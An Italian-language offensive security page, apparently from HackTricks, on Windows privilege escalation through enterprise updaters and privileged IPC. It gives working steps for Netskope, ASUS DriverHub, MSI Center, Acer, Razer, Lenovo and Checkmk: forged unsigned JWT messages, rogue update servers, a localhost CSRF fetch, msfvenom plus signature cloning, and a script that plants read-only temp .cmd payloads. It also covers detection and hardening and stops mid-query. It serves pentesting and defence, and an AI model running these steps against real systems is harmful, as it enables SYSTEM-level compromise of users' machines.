# Abuso degli auto-updater aziendali e dell’IPC privilegiato (ad es., Netskope, ASUS e MSI)

{{#include ../../banners/hacktricks-training.md}}

Questa pagina generalizza una classe di catene di escalation dei privilegi locali in Windows, individuate negli agent e negli updater aziendali per endpoint che espongono una superficie IPC facilmente raggiungibile e un flusso di aggiornamento privilegiato. Un esempio rappresentativo è Netskope Client per Windows < R129 (CVE-2025-0309), in cui un utente con privilegi limitati può forzare la procedura di registrazione a usare un server controllato dall’attaccante e quindi inviare un MSI malevolo che il servizio installa come SYSTEM.<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>

Idee chiave riutilizzabili contro prodotti simili:
- Abusare dell’IPC su localhost di un servizio privilegiato per forzare una nuova registrazione o riconfigurarlo affinché punti a un server dell’attaccante.
- Implementare gli endpoint di aggiornamento del vendor, fornire una Trusted Root CA malevola e indirizzare l’updater verso un pacchetto malevolo “firmato”.
- Eludere i controlli deboli sui firmatari (allow-list CN), i flag digest opzionali e le proprietà MSI permissive.
- Se l’IPC è “crittografato”, ricavare la chiave/IV da identificatori della macchina leggibili da tutti e memorizzati nel registro.
- Se il servizio limita i chiamanti in base al percorso dell’immagine o al nome del processo, iniettare il codice in un processo presente nell’allow-list oppure avviarne uno in stato sospeso e caricare la propria DLL con una modifica minima al contesto del thread.

Anche i servizi TCP locali personalizzati richiedono lo stesso esame dell’identità e dei confini degli input, anche quando richiedono un PIN o altre credenziali dell’applicazione. Individua il processo associato al listener e l’account di servizio effettivo, quindi esamina l’esatto binario/versione distribuito e verifica se i campi controllabili dal chiamante vengono sottoposti a controllo della lunghezza prima di essere copiati in buffer a dimensione fissa o usati per costruire il comando di un processo figlio. Le [indicazioni di Microsoft sui buffer overflow](https://learn.microsoft.com/en-us/windows/win32/secbp/avoiding-buffer-overruns) spiegano perché gli input esterni non verificati sono pericolosi nel codice nativo privilegiato. Un listener loopback, una credenziale hardcoded o il solo nome di un processo non dimostrano la presenza di una corruzione della memoria o l’esecuzione come SYSTEM: raggiungibilità, autorizzazione, percorso del codice e mitigazioni restano condizioni distinte. Mantieni passiva l’enumerazione di routine, anziché inviare a un servizio attivo input di lunghezza tale da provocarne l’arresto.

---
## 1) Forzare la registrazione verso un server dell’attaccante tramite IPC su localhost

Molti agent includono un processo UI in modalità utente che comunica con un servizio SYSTEM tramite TCP su localhost usando JSON.

Osservato in Netskope:
- UI: stAgentUI (integrità bassa) ↔ Service: stAgentSvc (SYSTEM)
- ID comando IPC 148: IDP_USER_PROVISIONING_WITH_TOKEN

Flusso dell’exploit:
1) Crea un token di registrazione JWT con claim che controllano l’host backend (ad es., AddonUrl). Usa alg=None, così non è necessaria alcuna firma.
2) Invia il messaggio IPC che invoca il comando di registrazione con il tuo JWT e il nome del tenant:

```json
{
  "148": {
    "idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
    "tenantName": "TestOrg"
  }
}
```

3) Il servizio inizia a contattare il tuo server rogue per enrollment/config, ad esempio:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Note:
- Se la verifica del chiamante si basa sul percorso/nome, avvia la richiesta da un vendor binary inserito nella allowlist (vedi §4).<sup>[[1]](#references)[[2]](#references)</sup>

### IPC di gestione esposto in rete

Questo confine di fiducia non è sempre limitato a localhost. Nel caso segnalato di MyReport Updater 2.1.1, un servizio `LocalSystem` era in ascolto su tutte le interfacce e accettava una modifica non autenticata della configurazione gRPC per l'host di riferimento, la porta e la modalità operativa. Per la variante remota erano necessari sia l'accesso di rete al listener sia l'accesso in uscita dal servizio al riferimento scelto. Valuta questi aspetti separatamente dalla possibilità che il successivo flusso del pacchetto superi il confine di scrittura dei file.<sup>[[16]](#references)</sup>

---
## 2) Hijacking del canale di aggiornamento per eseguire codice come SYSTEM

Una volta che il client comunica con il tuo server, implementa gli endpoint previsti e indirizzalo verso un MSI controllato dall'attaccante. Sequenza tipica:

1) /v2/config/org/clientconfig → Restituisci una configurazione JSON con un intervallo dell'updater molto breve, ad esempio:
```json
{
  "clientUpdate": { "updateIntervalInMin": 1 },
  "check_msi_digest": false
}
```
2) /config/ca/cert → Restituisce un certificato CA PEM. Il servizio lo installa nell'archivio Trusted Root del computer locale.
3) /v2/checkupdate → Fornisce metadati che puntano a un MSI malevolo e a una versione falsa.

Bypass dei controlli comuni osservati in natura:
- Signer CN allow-list: il servizio potrebbe verificare solo che il Subject CN sia uguale a “netSkope Inc” o “Netskope, Inc.”. La tua rogue CA può emettere un certificato leaf con quel CN e firmare l'MSI.
- Proprietà CERT_DIGEST: includi una proprietà MSI innocua denominata CERT_DIGEST. Non viene applicato alcun controllo durante l'installazione.
- Verifica facoltativa del digest: un flag di configurazione (ad es. check_msi_digest=false) disabilita la convalida crittografica aggiuntiva.

Risultato: il servizio SYSTEM installa il tuo MSI da
C:\ProgramData\Netskope\stAgent\data\*.msi
ed esegue codice arbitrario come NT AUTHORITY\SYSTEM.<sup>[[1]](#references)[[2]](#references)</sup>

Lezione sul bypass delle patch: se un vendor risponde aggiungendo un piccolo insieme di domini “trusted” a un'allow-list, invece di autenticare crittograficamente la fonte dell'aggiornamento, cerca redirector o reverse proxy di proprietà del vendor che consentano ancora di deviare il traffico. Nel caso di Netskope, ricerche pubbliche successive hanno mostrato che un'allow-list dell'era R129 poteva ancora essere sfruttata tramite `rproxy.goskope.com`, che faceva da proxy a contenuti controllati dagli attacker su Azure App Service. Considera le hostname allow-list come un ostacolo, non come un confine di fiducia.<sup>[[14]](#references)</sup>

Un'altra modalità di errore è costituita da **metadati del pacchetto coerenti tra loro ma non autenticati**. Nel caso MyReport, un riferimento controllato dall'attacker serviva un archivio modificato, mentre un intermediario alterava le risposte del vendor relative all'hash MD5 e alle dimensioni prima che raggiungessero l'updater. La corrispondenza di quei valori verificava la coerenza delle risposte, non la provenienza dal vendor; non era necessario alcun collisione MD5. Una directory di installazione scelta dal chiamante trasformava poi l'estrazione privilegiata in un punto di scrittura di file. La primitiva di caricamento DLL risultante è trattata in [chaining an arbitrary file write into DLL hijacking](dll-hijacking/#chaining-an-arbitrary-file-write-into-a-missing-dll-hijack).<sup>[[16]](#references)</sup>

---
## 3) Forging di richieste IPC crittografate (se presenti)

A partire da R127, Netskope ha racchiuso il JSON IPC in un campo encryptData che sembra Base64. Il reverse engineering ha rivelato l'uso di AES con chiave/IV derivati da valori di registro leggibili da qualsiasi utente:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Gli attacker possono riprodurre la crittografia e inviare comandi crittografati validi da un utente standard.<sup>[[1]](#references)[[2]](#references)</sup> Suggerimento generale: se un agent inizia improvvisamente a “crittografare” il proprio IPC, cerca ID dispositivo, GUID di prodotto e ID di installazione sotto HKLM da usare come materiale.

---
## 4) Bypass degli IPC caller allow-list (controlli del percorso/nome)

Alcuni servizi cercano di autenticare il peer risolvendo il PID della connessione TCP e confrontando il percorso/nome dell'immagine con i binari del vendor inclusi nell'allow-list e collocati in Program Files (ad es. stagentui.exe, bwansvc.exe, epdlp.exe).

Due bypass pratici:
- DLL injection in un processo incluso nell'allow-list (ad es. nsdiag.exe) e proxy dell'IPC dall'interno del processo.
- Avviare un binario incluso nell'allow-list in stato sospeso e inizializzare la tua proxy DLL senza CreateRemoteThread (vedi §5) per soddisfare le regole anti-tampering applicate dal driver.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 5) Injection compatibile con la protezione anti-tampering: processo sospeso + patch NtContinue

Spesso i prodotti includono un driver minifilter/OB callbacks (ad es. Stadrv) per rimuovere i diritti pericolosi dagli handle ai processi protetti:
- Process: rimuove PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread: limita a THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

Un loader user-mode affidabile che rispetta questi vincoli:
1) Creare un processo con CreateProcess usando un binario del vendor e CREATE_SUSPENDED.
2) Ottenere gli handle ancora consentiti: PROCESS_VM_WRITE | PROCESS_VM_OPERATION sul processo e un handle del thread con THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (oppure solo THREAD_RESUME se si applica la patch al codice a un RIP noto).
3) Sovrascrivere ntdll!NtContinue (o un altro thunk iniziale sicuramente mappato) con uno stub minimale che chiama LoadLibraryW sul percorso della tua DLL, quindi torna indietro con un salto.
4) Chiamare ResumeThread per eseguire lo stub nel processo e caricare la tua DLL.

Poiché non hai mai usato PROCESS_CREATE_THREAD o PROCESS_SUSPEND_RESUME su un processo già protetto (lo hai creato tu), la policy del driver viene rispettata.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 6) Strumenti pratici
- NachoVPN (plugin Netskope) automatizza una rogue CA, la firma di un MSI malevolo e la fornitura degli endpoint necessari: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.<sup>[[3]](#references)</sup>
- UpSkope è un client IPC personalizzato che crea messaggi IPC arbitrari (facoltativamente crittografati con AES) e include l'injection tramite processo sospeso per originare da un binario incluso nell'allow-list.<sup>[[4]](#references)</sup>

## 7) Workflow rapido di triage per superfici updater/IPC sconosciute

Quando si esamina un nuovo agent endpoint o una suite di “helper” della scheda madre, di solito basta un workflow rapido per capire se si tratta di un promettente target di privesc:<sup>[[6]](#references)</sup>

1) Enumerare i listener loopback e ricondurli ai processi del vendor:

```powershell
Get-NetTCPConnection -State Listen |
  Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
  Select-Object LocalAddress,LocalPort,OwningProcess,
    @{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```

2) Enumerare le named pipe candidate:

```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```

3) Estrai i dati di routing archiviati nel registro e usati dai server IPC basati su plugin:

```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
  Select-Object PSChildName
```

4) Estrai prima i nomi degli endpoint, le chiavi JSON e gli ID dei comandi dal client in user-mode. I frontend Electron/.NET pacchettizzati spesso fanno leak dello schema completo:

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
  -Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```

5) Cerca il predicato di fiducia effettivo, non solo il percorso di codice che alla fine avvia il processo:

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.exe','C:\Program Files\Vendor\**\*.dll','C:\Program Files\Vendor\**\*.js' `
  -Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'
```

Pattern da prioritizzare:
- `CryptQueryObject`/parsing dei certificati senza `WinVerifyTrust` di solito significa che “il certificato esiste” è stato interpretato come “il certificato è attendibile”, consentendo la clonazione dei certificati o altri trucchi con falsi firmatari.
- I controlli su sottostringhe/suffissi applicati a `Origin`, `Referer`, URL di download, nomi di processi o CN dei firmatari non sono autenticazione. `contains(".vendor.com")` è spesso sfruttabile con domini simili controllati dall’attaccante.
- Se la GUI con privilegi limitati decide che “il file è attendibile” e il broker SYSTEM si limita a usare quel risultato, applicare patch o reimplementare la DLL/JS lato client spesso aggira completamente il confine (validazione separata in stile Razer).
- Se il broker copia un payload in `%TEMP%`/`C:\Windows\Temp` e poi lo convalida o lo pianifica da quel percorso, verifica subito le finestre di sostituzione TOCTOU e la presenza di moduli plugin fratelli che espongono wrapper alternativi `ExecuteTask()` con controlli più deboli.<sup>[[6]](#references)</sup>

Per i target che fanno ampio uso di named pipe, PipeViewer è un modo rapido per individuare DACL deboli e pipe raggiungibili da remoto prima di iniziare ad analizzare in profondità il protocollo.<sup>[[11]](#references)</sup>

Se il target autentica i chiamanti solo tramite PID, percorso dell’immagine o nome del processo, considera questo controllo un ostacolo minore, non un confine: iniettarsi nel client legittimo o effettuare la connessione da un processo consentito è spesso sufficiente a superare i controlli del server. Per le named pipe in particolare, [questa pagina sull’impersonificazione del client e l’abuso delle pipe](named-pipe-client-impersonation.md) approfondisce la tecnica.

Per un **broker di cleanup o ripristino** privilegiato, esamina il confine di attendibilità dei percorsi oltre all’ACL della pipe. Un chiamante con privilegi inferiori potrebbe riuscire a selezionare una destinazione di ripristino o rinominare un backup preparato in una directory condivisa, anche se l’eseguibile del servizio e la relativa directory di installazione sono protetti. Verifica separatamente che il chiamante possa raggiungere il comando di ripristino, modificare l’input preparato o il nome file esatto, che il broker venga eseguito con un’identità con privilegi superiori e che l’operazione di ripristino scriva effettivamente nel percorso protetto selezionato. Una directory di preparazione scrivibile o una pipe leggibile, da sole, non dimostrano la possibilità di effettuare scritture privilegiate arbitrarie; la mappatura della destinazione e il comportamento del servizio richiedono una revisione del codice o test controllati. Non invocare un comando di cleanup sconosciuto durante l’enumerazione passiva, perché potrebbe eliminare file degli utenti.

---
## 8) Broker di add-in modulari autenticati solo tramite firme del vendor (schema Lenovo Vantage)

Una variante più recente da cercare è il **broker RPC con client firmato**: un processo desktop Lenovo firmato con privilegi limitati comunica con un servizio SYSTEM, e il servizio inoltra comandi JSON a un insieme di add-in descritti in XML sotto `%ProgramData%`. Una volta ottenuta l’esecuzione di codice **all’interno di un qualsiasi client firmato accettato**, ogni contratto `runas="system"` diventa parte della superficie d’attacco.<sup>[[15]](#references)</sup>

Primitive di alto valore osservate nella ricerca su Lenovo Vantage:
- **Fidarsi del chiamante perché è firmato dal vendor**: i ricercatori hanno raggiunto un contesto autenticato copiando un EXE firmato da Lenovo in una directory scrivibile e sfruttando un DLL side-load (`profapi.dll`) per eseguire codice arbitrario all’interno di un client già considerato attendibile dal servizio.
- **Individuazione della superficie d’attacco tramite manifest**: gli add-in sono dichiarati in `C:\ProgramData\Lenovo\Vantage\Addins\*.xml`; diversi contratti vengono eseguiti come `SYSTEM`, quindi enumerare questi manifest spesso rivela i verbi privilegiati effettivi più rapidamente che analizzare il broker stesso.
- **Bug specifici dei comandi dietro il canale autenticato**: una volta all’interno del client attendibile, la ricerca pubblica ha individuato condizioni di path traversal + race nei verbi di aggiornamento/installazione, abuso di SQL grezzo nei database delle impostazioni privilegiati e controlli dei percorsi del registro basati su sottostringhe che consentivano scritture al di fuori dell’hive previsto.

Ricognizione utile su un target:

```powershell
Get-ChildItem "$env:ProgramData\Lenovo\Vantage\Addins" -Filter *.xml |
  Select-String -Pattern 'runas="system"|<name>|<namespace>'
```

```powershell
Select-String -Path 'C:\Program Files\Lenovo\**\*.dll','C:\Program Files\Lenovo\**\*.exe' `
  -Pattern 'contract|command|payload|DeleteTable|DeleteSetting|Set-KeyChildren|DownloadAndInstallAppComponent|InstallOnly'
```

Indicazione pratica: ogni volta che una suite di utility espone un broker che prima autentica il **processo chiamante** e solo dopo inoltra le richieste a decine di comandi di plugin/add-in, non fermarti dopo aver aggirato il controllo di fiducia iniziale. Estrai la tabella manifest/contract e fai fuzzing indipendentemente su ogni operazione con privilegi elevati; il canale autenticato spesso nasconde diversi bug di secondo livello.

---
## 1) CSRF dal browser a localhost contro API HTTP privilegiate (ASUS DriverHub)

DriverHub include un servizio HTTP in modalità user (ADU.exe) su 127.0.0.1:53000 che si aspetta chiamate dal browser provenienti da https://driverhub.asus.com. Il filtro dell'origine esegue semplicemente `string_contains(".asus.com")` sull'header Origin e sugli URL di download esposti da `/asus/v1.0/*`. Qualsiasi host controllato dall'attaccante, ad esempio `https://driverhub.asus.com.attacker.tld`, supera quindi il controllo e può inviare richieste che modificano lo stato tramite JavaScript.<sup>[[6]](#references)</sup> Consulta [CSRF basics](../../pentesting-web/csrf-cross-site-request-forgery.md) per ulteriori modalità di bypass.

Flusso pratico:
1) Registra un dominio che includa `.asus.com` e ospitavi una pagina web malevola.
2) Usa `fetch` o XHR per chiamare un endpoint privilegiato (ad es., `Reboot`, `UpdateApp`) su `http://127.0.0.1:53000`.
3) Invia il corpo JSON previsto dall'handler: il JavaScript frontend compresso mostra lo schema qui sotto.

```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```

Anche la CLI PowerShell mostrata di seguito ha successo quando l'header Origin viene falsificato impostandolo sul valore attendibile:

```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
  -Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
  -Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```

Qualsiasi visita del browser al sito dell’attaccante diventa quindi un CSRF locale con 1 clic (o 0 clic tramite `onload`) che attiva un helper con privilegi SYSTEM.

---
## 2) Verifica insicura della firma del codice e clonazione del certificato (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` scarica eseguibili arbitrari definiti nel body JSON e li memorizza nella cache in `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. La validazione dell’URL di download riutilizza la stessa logica basata su sottostringhe, quindi `http://updates.asus.com.attacker.tld:8000/payload.exe` viene accettato. Dopo il download, ADU.exe verifica solo che il PE contenga una firma e che la stringa Subject corrisponda ad ASUS prima di eseguirlo: non usa `WinVerifyTrust` né convalida la catena.

Per rendere sfruttabile il flusso:
1) Crea un payload (ad es., `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) Clona nel payload il signer di ASUS (ad es., `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) Ospita `pwn.exe` su un dominio simile a `.asus.com` e attiva UpdateApp tramite il CSRF del browser descritto sopra.

Poiché sia i filtri Origin che quelli URL si basano su sottostringhe e il controllo del signer confronta solo stringhe, DriverHub scarica ed esegue il binario dell’attaccante nel proprio contesto elevato.<sup>[[6]](#references)</sup>

---
## 1) TOCTOU nei percorsi di copia/esecuzione dell’updater (MSI Center CMD_AutoUpdateSDK)

Il servizio SYSTEM di MSI Center espone un protocollo TCP in cui ogni frame è composto da `4-byte ComponentID || 8-byte CommandID || ASCII arguments`. Il componente core (Component ID `0f 27 00 00`) include `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Il relativo handler:
1) Copia l’eseguibile fornito in `C:\Windows\Temp\MSI Center SDK.exe`.
2) Verifica la firma tramite `CS_CommonAPI.EX_CA::Verify` (il subject del certificato deve essere “MICRO-STAR INTERNATIONAL CO., LTD.” e `WinVerifyTrust` deve avere esito positivo).
3) Crea un’attività pianificata che esegue il file temporaneo come SYSTEM con argomenti controllati dall’attaccante.

Il file copiato non viene bloccato tra la verifica e `ExecuteTask()`. Un attaccante può:
- Inviare il Frame A indicando un binario firmato legittimamente da MSI (garantisce il superamento del controllo della firma e l’inserimento dell’attività nella coda).
- Sfruttare una race condition inviando ripetuti messaggi Frame B che indicano un payload malevolo e sovrascrivono `MSI Center SDK.exe` subito dopo il completamento della verifica.

Quando l’Utilità di pianificazione avvia l’attività, esegue il payload sovrascritto come SYSTEM, nonostante sia stato convalidato il file originale. Per uno sfruttamento affidabile si usano due goroutine/thread che inviano ripetutamente CMD_AutoUpdateSDK fino a vincere la finestra TOCTOU.<sup>[[6]](#references)</sup>

---
## 2) Abuso di IPC personalizzato a livello SYSTEM e impersonificazione (MSI Center + Acer Control Centre)

### Set di comandi TCP di MSI Center
- Ogni plugin/DLL caricato da `MSI.CentralServer.exe` riceve un Component ID memorizzato in `HKLM\SOFTWARE\MSI\MSI_CentralServer`. I primi 4 byte di un frame selezionano quel componente, consentendo agli attaccanti di indirizzare i comandi a moduli arbitrari.
- I plugin possono definire i propri task runner. `Support\API_Support.dll` espone `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` e chiama direttamente `API_Support.EX_Task::ExecuteTask()` **senza alcuna verifica della firma**: qualsiasi utente locale può indicargli `C:\Users\<user>\Desktop\payload.exe` e ottenere in modo deterministico l’esecuzione come SYSTEM.
- Sniffare il loopback con Wireshark o analizzare i binari .NET in dnSpy consente di individuare rapidamente la corrispondenza tra componenti e comandi; è quindi possibile usare client personalizzati in Go/Python per riprodurre i frame.<sup>[[6]](#references)</sup>

### Named pipe di Acer Control Centre e livelli di impersonificazione
- `ACCSvc.exe` (SYSTEM) espone `\\.\pipe\treadstone_service_LightMode` e la relativa ACL discrezionale consente l’accesso ai client remoti (ad es., `\\TARGET\pipe\treadstone_service_LightMode`). L’invio del command ID `7` con un percorso file richiama la routine del servizio che avvia processi.
- La libreria client serializza un byte terminatore speciale (113) insieme agli argomenti. L’instrumentazione dinamica con Frida/`TsDotNetLib` (vedi [Strumenti e metodi di base per il reverse engineering](../../reversing/reversing-tools-basic-methods/README.md) per suggerimenti sull’instrumentazione) mostra che l’handler nativo associa questo valore a un `SECURITY_IMPERSONATION_LEVEL` e a un SID di integrità prima di chiamare `CreateProcessAsUser`.
- Sostituendo 113 (`0x71`) con 114 (`0x72`) si passa al ramo generico, che conserva il token SYSTEM completo e imposta un SID a integrità elevata (`S-1-16-12288`). Il binario avviato viene quindi eseguito come SYSTEM senza restrizioni, sia localmente che tra macchine.
- Abbinando il tutto al flag di installazione esposto (`Setup.exe -nocheck`), è possibile installare ACC anche su VM di laboratorio e testare la pipe senza hardware del vendor.<sup>[[6]](#references)</sup>

Questi bug IPC evidenziano perché i servizi localhost devono imporre l’autenticazione reciproca (SID ALPC, filtri `ImpersonationLevel=Impersonation`, filtraggio dei token) e perché l’helper “run arbitrary binary” di ogni modulo deve applicare le stesse verifiche del signer.

---
## 3) Helper COM/IPC “elevator” convalidati in modo debole in user mode (Razer Synapse 4)

Razer Synapse 4 ha introdotto un altro schema utile in questa famiglia: un utente con privilegi limitati può chiedere a un helper COM di avviare un processo tramite `RzUtility.Elevator`, mentre la decisione sulla fiducia è delegata a una DLL in user mode (`simple_service.dll`) anziché essere applicata in modo robusto all’interno del perimetro privilegiato.

Percorso di sfruttamento osservato:
- Istanzia l’oggetto COM `RzUtility.Elevator`.
- Chiama `LaunchProcessNoWait(<path>, "", 1)` per richiedere l’avvio con privilegi elevati.
- Nel PoC pubblico, il controllo della firma PE in `simple_service.dll` viene rimosso tramite patch prima di inviare la richiesta, consentendo l’avvio di un eseguibile arbitrario scelto dall’attaccante.<sup>[[6]](#references)[[10]](#references)</sup>

Invocazione PowerShell minima:

```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```

Considerazione generale: quando si analizzano in reverse engineering le suite “helper”, non fermarsi a TCP localhost o alle named pipe. Verificare la presenza di classi COM con nomi come `Elevator`, `Launcher`, `Updater` o `Utility`, quindi controllare se il servizio privilegiato convalida effettivamente il binario di destinazione oppure si fida soltanto di un risultato calcolato da una DLL client in user mode modificabile. Questo schema si generalizza oltre Razer: qualsiasi architettura suddivisa in cui il broker con privilegi elevati si basa su una decisione di consentire o negare proveniente dal lato con privilegi ridotti è una possibile superficie di privesc.


---
## Esecuzione di script temporanei prevedibili durante la riparazione MSI (Checkmk Agent / CVE-2024-0670)

Alcuni agent Windows eseguono ancora azioni privilegiate scrivendo un file `.cmd` temporaneo in `C:\Windows\Temp` ed eseguendolo come `SYSTEM`. Se il nome del file è prevedibile e il servizio non ricrea in modo sicuro i file esistenti, un utente con privilegi ridotti può creare in anticipo il futuro file temporaneo come **sola lettura** e fare in modo che il processo privilegiato esegua contenuto controllato dall'attaccante invece del proprio script.

Osservato nelle build vulnerabili di Checkmk Agent:
- schema dei file temporanei: `cmk_all_<PID>_1.cmd`
- rami interessati: `2.0.0`, `2.1.0`, `2.2.0`
- trigger: **riparazione** MSI del pacchetto dell'agent memorizzato nella cache<sup>[[8]](#references)[[9]](#references)</sup>

Procedura pratica:
1. Stimare un intervallo realistico di PID in base agli ID dei processi attuali o al PID dell'agent in esecuzione.
2. Scrivere un payload `.cmd` breve in **ASCII** (`Set-Content -Encoding Ascii` o redirezione di `cmd.exe`; evitare l'output PowerShell UTF-16 per i file batch).
3. Creare file `C:\Windows\Temp\cmk_all_<PID>_1.cmd` nell'intervallo candidato e contrassegnare ciascun file come di sola lettura.
4. Avviare la riparazione dell'MSI memorizzato nella cache, affinché il servizio privilegiato tenti di rigenerare ed eseguire lo script temporaneo.<sup>[[7]](#references)</sup>

```powershell
Set-Content -Path C:\ProgramData\payload.cmd -Encoding Ascii -Value "@echo off`nwhoami > C:\ProgramData\proof.txt"
1..10000 | ForEach-Object {
  Copy-Item C:\ProgramData\payload.cmd "C:\Windows\Temp\cmk_all_${_}_1.cmd"
  Set-ItemProperty "C:\Windows\Temp\cmk_all_${_}_1.cmd" -Name IsReadOnly -Value $true
}
```

Se il prodotto vulnerabile è installato con Windows Installer, risali dal file MSI memorizzato nella cache, dal nome apparentemente casuale, al nome del prodotto prima di avviare la riparazione:<sup>[[7]](#references)</sup>

```powershell
Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties" |
  ForEach-Object {
    $p = Get-ItemProperty $_.PSPath
    [PSCustomObject]@{Name=$p.DisplayName; Pkg=$p.LocalPackage}
  } | Where-Object Name -like "*Check MK Agent*"

msiexec /fa C:\Windows\Installer\<cached-agent>.msi
```

Note operative:
- `qwinsta` è utile quando `msiexec /fa` non funziona da una shell WinRM non interattiva e occorre capire se una sessione desktop esistente/disconnessa può attivare correttamente la riparazione.<sup>[[7]](#references)</sup>
- Questo schema si applica anche ad altri agent e updater endpoint che **salvano script temporanei in percorsi scrivibili da tutti e in seguito li eseguono come SYSTEM**. Verifica la presenza di nomi prevedibili, l'assenza di semantiche di creazione esclusiva e di flussi di riparazione/aggiornamento attivabili su richiesta.

### Riparazione interattiva dell'installer e console con privilegi elevati

PDF24 Creator 11.15.1 illustra un rischio distinto legato alla riparazione MSI: la sua custom action di installazione della stampante può avviare una console visibile con diritti SYSTEM durante la riparazione. Il vendor ha modificato l'installer MSI nella versione 11.15.2 per risolvere questo comportamento. Una versione precedente del prodotto è solo un indizio da approfondire. Verifica il pacchetto MSI registrato o raggiungibile, se l'utente può avviare la riparazione, se sono presenti la custom action vulnerabile e il ritardo del file di log e se un desktop interattivo può esporre la console. Il ritardo segnalato sfruttava un oplock su `faxPrnInst.log`; la semplice possibilità di scrivere nel file non è l'unica condizione di accesso. Una shell non interattiva, un pacchetto inaccessibile o un installer aggiornato possono interrompere la catena. Questo problema non dipende da `AlwaysInstallElevated` ed è diverso dalla sostituzione di uno script temporaneo prevedibile.

---
## Hijacking remoto della supply chain tramite validazione debole degli updater (WinGUp / Notepad++)

Tra giugno 2025 e dicembre 2025, gli attaccanti che avevano compromesso l'infrastruttura di hosting alla base del flusso di aggiornamento di Notepad++ hanno servito selettivamente manifest malevoli a vittime specifiche. Gli updater più vecchi basati su WinGUp non verificavano completamente l'autenticità degli aggiornamenti, quindi una risposta XML malevola poteva reindirizzare i client a URL controllati dagli attaccanti. Poiché il client accettava contenuti HTTPS senza verificare sia una catena di certificati attendibile sia una firma PE valida sull'installer scaricato, le vittime scaricavano ed eseguivano un `update.exe` NSIS trojanizzato.<sup>[[12]](#references)[[13]](#references)</sup>

Flusso operativo (non è richiesto alcun exploit locale):
1. **Intercettazione dell'infrastruttura**: compromettere la CDN/hosting e rispondere ai controlli degli aggiornamenti con metadati dell'attaccante che indicano un URL di download malevolo.
2. **NSIS trojanizzato**: l'installer scarica/esegue un payload e sfrutta due catene di esecuzione:
   - **Bring-your-own signed binary + sideload**: includere il file firmato Bitdefender `BluetoothService.exe` e rilasciare una `log.dll` malevola nel suo percorso di ricerca. Quando viene eseguito il file binario firmato, Windows esegue il sideload di `log.dll`, che decritta e carica in modo riflessivo la backdoor Chrysalis (protetta da Warbird + hashing delle API per ostacolare il rilevamento statico).
   - **Iniezione di shellcode tramite script**: NSIS esegue uno script Lua compilato che usa API Win32 (ad es. `EnumWindowStationsW`) per iniettare shellcode e predisporre Cobalt Strike Beacon.<sup>[[12]](#references)</sup>

Indicazioni per hardening/rilevamento per qualsiasi auto-updater:
- Imporre la **verifica del certificato e della firma** dell'installer scaricato (fissare il signer del vendor, rifiutare CN/catene non corrispondenti) e firmare il manifest di aggiornamento stesso (ad es. XMLDSig). Bloccare i reindirizzamenti controllati dal manifest, a meno che non siano convalidati.
- Considerare il **sideloading di un binario firmato BYO** come un punto di rilevamento successivo al download: generare un alert quando un EXE firmato del vendor carica una DLL con un nome proveniente da un percorso diverso da quello canonico d'installazione (ad es. Bitdefender che carica `log.dll` da Temp/Downloads) e quando un updater rilascia/esegue installer da percorsi temporanei con firme non appartenenti al vendor.
- Monitorare gli **artefatti specifici del malware** osservati in questa catena (utili come indicatori generici): mutex `Global\Jdhfv_1.0.1`, scritture anomale di `gup.exe` in `%TEMP%` e fasi di iniezione di shellcode guidate da Lua.
- Notepad++ ha risposto rafforzando WinGUp dalla versione v8.8.9 in poi: l'XML restituito è ora firmato (XMLDSig) e le versioni più recenti impongono la verifica del certificato e della firma dell'installer scaricato, anziché fidarsi solo del trasporto.<sup>[[13]](#references)</sup>

<details>
<summary>Cortex XDR XQL – sideloading di <code>log.dll</code> da un EXE firmato Bitdefender (T1574.001)</summary>

```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
